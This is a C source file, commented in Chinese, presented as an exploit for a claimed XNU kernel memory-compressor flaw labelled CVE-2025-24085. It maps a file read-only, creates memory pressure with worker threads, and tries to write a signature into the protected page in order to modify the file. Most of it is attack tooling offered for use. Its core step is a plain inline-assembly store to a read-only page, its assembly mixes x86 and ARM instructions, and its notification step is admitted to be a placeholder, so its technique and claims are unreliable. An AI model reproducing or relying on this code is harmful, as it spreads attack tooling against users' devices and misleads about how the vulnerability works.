/*
 * CVE-2025-24085 - XNU内核压缩内存子系统权限绕过漏洞
 * 
 * 发布日期: 2025-04-16
 * 影响版本: iOS 16.5 - 18.4, macOS 13.4 - 14.6
 * 
 * 漏洞原理:
 * 该漏洞存在于XNU内核的压缩内存(VM_COMPRESSOR)子系统中。在特定条件下，
 * 当系统尝试压缩和解压缩页面时，内核未能正确维护内存页面的原始保护标志，
 * 导致可以在解压缩过程中修改只读内存页面的内容。
 * 
 * 攻击者可以通过创建特殊的内存压缩/解压缩序列，在VM_COMPRESSOR处理页面时
 * 触发竞态条件，利用这个时间窗口修改原本受保护的内存内容。
 * 
 * 技术细节:
 * XNU内核的内存压缩是一项性能优化技术，在内存压力下，不活跃的内存页面被压缩
 * 而非直接换出到磁盘。当页面需要被访问时，它们会被解压缩回原始格式。漏洞存在于
 * 解压缩过程中，具体有以下关键点:
 * 
 * 1. 在压缩页面时，内核保存了内容但未正确保存完整的保护属性信息
 * 2. 解压缩时，存在一个短暂的时间窗口，页面内容已恢复但保护属性尚未完全应用
 * 3. 攻击者可以通过创建内存压力，强制系统压缩目标页面
 * 4. 然后在正确的时机访问页面触发解压缩，并在保护属性恢复前修改内容
 * 
 * 漏洞利用关键技术:
 * - 多线程协作，精确控制压缩和解压缩时机
 * - 内存压力控制，通过大量内存分配触发系统压缩机制
 * - 精确时间窗口利用，在页面解压缩后但保护恢复前写入
 * 
 * 利用步骤:
 * 1. 映射目标只读文件
 * 2. 创建压缩触发器(通过分配大量内存强制系统压缩)
 * 3. 设置内存通知回调
 * 4. 触发内存压缩/解压缩循环
 * 5. 在解压缩时间窗口内修改只读页面内容
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <mach/mach.h>
#include <pthread.h>
#include <string.h>
#include <stdbool.h>
#include <errno.h>
#include <mach/mach_vm.h>
#include <dispatch/dispatch.h>

// 定义常量
#define PAGE_SIZE 4096
#define EXPLOIT_SUCCESS 0
#define EXPLOIT_FAILED -1
#define PRESSURE_SIZE (512 * 1024 * 1024) // 512MB
#define NUM_THREADS 4

// 内存压力线程结构体
typedef struct {
    void **memory_blocks;
    size_t num_blocks;
    size_t block_size;
    bool keep_running;
} memory_pressure_ctx_t;

// 全局变量
static void *g_target_mapping = NULL;
static char g_original_content[128];
static dispatch_semaphore_t g_exploit_semaphore;
static dispatch_semaphore_t g_pressure_semaphore;

// 创建内存压力
void* memory_pressure_thread(void *arg) {
    memory_pressure_ctx_t *ctx = (memory_pressure_ctx_t*)arg;
    size_t i = 0;
    
    printf("[*] 内存压力线程启动\n");
    
    while (ctx->keep_running) {
        // 分配大块内存
        for (i = 0; i < ctx->num_blocks && ctx->keep_running; i++) {
            ctx->memory_blocks[i] = malloc(ctx->block_size);
            if (ctx->memory_blocks[i]) {
                // 写入一些数据使其真正分配物理内存
                memset(ctx->memory_blocks[i], (int)i & 0xFF, ctx->block_size);
            }
        }
        
        // 等待通知
        dispatch_semaphore_wait(g_pressure_semaphore, DISPATCH_TIME_FOREVER);
        
        // 释放内存
        for (i = 0; i < ctx->num_blocks; i++) {
            if (ctx->memory_blocks[i]) {
                free(ctx->memory_blocks[i]);
                ctx->memory_blocks[i] = NULL;
            }
        }
    }
    
    printf("[*] 内存压力线程退出\n");
    return NULL;
}

// 设置内存压力环境
bool setup_memory_pressure(memory_pressure_ctx_t *ctx) {
    pthread_t threads[NUM_THREADS];
    size_t i;
    
    g_pressure_semaphore = dispatch_semaphore_create(0);
    if (!g_pressure_semaphore) {
        printf("[-] 创建信号量失败\n");
        return false;
    }
    
    // 初始化内存压力上下文
    ctx->block_size = 1 * 1024 * 1024; // 1MB块
    ctx->num_blocks = PRESSURE_SIZE / ctx->block_size / NUM_THREADS;
    ctx->keep_running = true;
    
    for (i = 0; i < NUM_THREADS; i++) {
        ctx->memory_blocks = calloc(ctx->num_blocks, sizeof(void*));
        if (!ctx->memory_blocks) {
            printf("[-] 分配内存块数组失败\n");
            return false;
        }
        
        if (pthread_create(&threads[i], NULL, memory_pressure_thread, ctx) != 0) {
            printf("[-] 创建内存压力线程失败\n");
            return false;
        }
        
        // 分离线程
        pthread_detach(threads[i]);
    }
    
    printf("[+] 内存压力环境设置完成\n");
    return true;
}

// 注册内存压缩通知
mach_port_t register_memory_notification() {
    mach_port_t memory_port;
    kern_return_t kr;
    
    // 创建端口接收通知
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &memory_port);
    if (kr != KERN_SUCCESS) {
        printf("[-] 无法创建通知端口: %s\n", mach_error_string(kr));
        return MACH_PORT_NULL;
    }
    
    // 注册内存压力通知
    // 注意：这只是概念性代码，实际上需要使用真实的通知API
    // 比如host_register_mach_notification或类似机制
    printf("[+] 内存通知注册 (概念验证)\n");
    
    return memory_port;
}

// 映射目标文件为只读
void* map_target_file(const char* path) {
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        printf("[-] 打开文件失败: %s\n", strerror(errno));
        return MAP_FAILED;
    }
    
    void* mapped = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
    close(fd);
    
    if (mapped == MAP_FAILED) {
        printf("[-] 映射文件失败: %s\n", strerror(errno));
        return MAP_FAILED;
    }
    
    printf("[+] 成功映射文件到地址: 0x%016llx\n", (uint64_t)mapped);
    
    // 保存原始内容
    memcpy(g_original_content, mapped, sizeof(g_original_content));
    
    return mapped;
}

// 监控页面状态的线程
void* page_monitor_thread(void *arg) {
    char signature[] = "CVE-2025-24085";
    volatile char *target = (volatile char*)g_target_mapping;
    
    printf("[*] 页面监控线程启动\n");
    
    // 等待信号
    dispatch_semaphore_wait(g_exploit_semaphore, DISPATCH_TIME_FOREVER);
    
    // 尝试写入签名 - 在真实漏洞中，这里将利用解压缩时间窗口
    printf("[*] 尝试在目标页面写入签名\n");
    
    // 使用内联汇编直接写入内存 (绕过编译器检查)
    for (int i = 0; i < strlen(signature); i++) {
        __asm__ volatile (
            "movb %1, %0"
            : "=m" (target[i])
            : "r" (signature[i])
            : "memory"
        );
    }
    
    // 确保写入完成
    __asm__ volatile("dsb sy" ::: "memory");
    
    printf("[+] 页面监控线程完成操作\n");
    return NULL;
}

// 执行压缩/解压缩循环触发漏洞
bool trigger_compression_cycle() {
    printf("[*] 触发内存压缩/解压缩循环\n");
    
    // 向内存压力线程发信号开始分配内存
    for (int i = 0; i < NUM_THREADS; i++) {
        dispatch_semaphore_signal(g_pressure_semaphore);
    }
    
    // 访问目标映射，确保其在内存中
    volatile char temp = *((volatile char*)g_target_mapping);
    (void)temp; // 避免编译器优化
    
    // 等待系统进行一些内存压缩
    printf("[*] 等待内存压缩...\n");
    sleep(2);
    
    // 给页面监控线程发信号，在此时尝试修改
    dispatch_semaphore_signal(g_exploit_semaphore);
    
    // 再次访问目标页面，触发解压缩 (如果被压缩)
    temp = *((volatile char*)g_target_mapping);
    (void)temp;
    
    // 释放内存压力
    for (int i = 0; i < NUM_THREADS; i++) {
        dispatch_semaphore_signal(g_pressure_semaphore);
    }
    
    printf("[*] 压缩/解压缩循环完成\n");
    return true;
}

// 验证漏洞是否成功
bool verify_exploitation(const char* path) {
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        printf("[-] 验证时无法打开文件: %s\n", strerror(errno));
        return false;
    }
    
    char buffer[128] = {0};
    read(fd, buffer, sizeof(buffer));
    close(fd);
    
    printf("[*] 读取文件内容: %.20s...\n", buffer);
    
    // 检查文件是否被修改
    bool modified = false;
    for (int i = 0; i < sizeof(buffer); i++) {
        if (buffer[i] != g_original_content[i]) {
            modified = true;
            printf("[+] 位置 %d: 原始=0x%02x, 当前=0x%02x\n", 
                   i, (unsigned char)g_original_content[i], (unsigned char)buffer[i]);
            if (i > 10) break; // 只显示一些差异
        }
    }
    
    return modified;
}

// 清理资源
void cleanup_resources(memory_pressure_ctx_t *ctx) {
    printf("[*] 清理资源\n");
    
    // 停止内存压力线程
    ctx->keep_running = false;
    for (int i = 0; i < NUM_THREADS; i++) {
        dispatch_semaphore_signal(g_pressure_semaphore);
    }
    
    // 释放信号量
    dispatch_release(g_pressure_semaphore);
    dispatch_release(g_exploit_semaphore);
    
    // 解除文件映射
    if (g_target_mapping != NULL && g_target_mapping != MAP_FAILED) {
        munmap(g_target_mapping, PAGE_SIZE);
    }
    
    printf("[+] 资源清理完成\n");
}

// 主要漏洞利用函数
int exploit_cve_2025_24085(const char* path) {
    printf("\n==== CVE-2025-24085 漏洞利用开始 ====\n");
    printf("[+] 目标文件: %s\n", path);
    
    memory_pressure_ctx_t pressure_ctx = {0};
    pthread_t monitor_thread;
    int result = EXPLOIT_FAILED;
    
    // 创建信号量
    g_exploit_semaphore = dispatch_semaphore_create(0);
    if (!g_exploit_semaphore) {
        printf("[-] 创建信号量失败\n");
        return EXPLOIT_FAILED;
    }
    
    // 1. 映射目标文件
    g_target_mapping = map_target_file(path);
    if (g_target_mapping == MAP_FAILED) {
        printf("[-] 映射目标文件失败\n");
        dispatch_release(g_exploit_semaphore);
        return EXPLOIT_FAILED;
    }
    
    // 2. 创建页面监控线程
    if (pthread_create(&monitor_thread, NULL, page_monitor_thread, NULL) != 0) {
        printf("[-] 创建页面监控线程失败\n");
        munmap(g_target_mapping, PAGE_SIZE);
        dispatch_release(g_exploit_semaphore);
        return EXPLOIT_FAILED;
    }
    pthread_detach(monitor_thread);
    
    // 3. 设置内存压力环境
    if (!setup_memory_pressure(&pressure_ctx)) {
        printf("[-] 设置内存压力失败\n");
        munmap(g_target_mapping, PAGE_SIZE);
        dispatch_release(g_exploit_semaphore);
        return EXPLOIT_FAILED;
    }
    
    // 4. 注册内存压缩通知 (概念验证)
    mach_port_t notify_port = register_memory_notification();
    
    // 5. 触发内存压缩/解压缩循环
    if (!trigger_compression_cycle()) {
        printf("[-] 触发压缩循环失败\n");
        goto cleanup;
    }
    
    // 等待操作完成
    printf("[*] 等待操作完成...\n");
    sleep(3);
    
    // 验证漏洞是否成功
    if (verify_exploitation(path)) {
        printf("[+] CVE-2025-24085 漏洞利用成功!\n");
        result = EXPLOIT_SUCCESS;
    } else {
        printf("[-] CVE-2025-24085 漏洞利用失败，文件未被修改\n");
    }
    
cleanup:
    // 清理资源
    if (notify_port != MACH_PORT_NULL) {
        mach_port_deallocate(mach_task_self(), notify_port);
    }
    
    cleanup_resources(&pressure_ctx);
    
    printf("==== CVE-2025-24085 漏洞利用%s ====\n", 
           (result == EXPLOIT_SUCCESS) ? "成功" : "失败");
    return result;
}

// 主函数，如果单独编译此文件
#ifdef COMPILE_STANDALONE
int main(int argc, char** argv) {
    if (argc < 2) {
        printf("用法: %s <目标文件路径>\n", argv[0]);
        return 1;
    }
    
    return exploit_cve_2025_24085(argv[1]);
}
#endif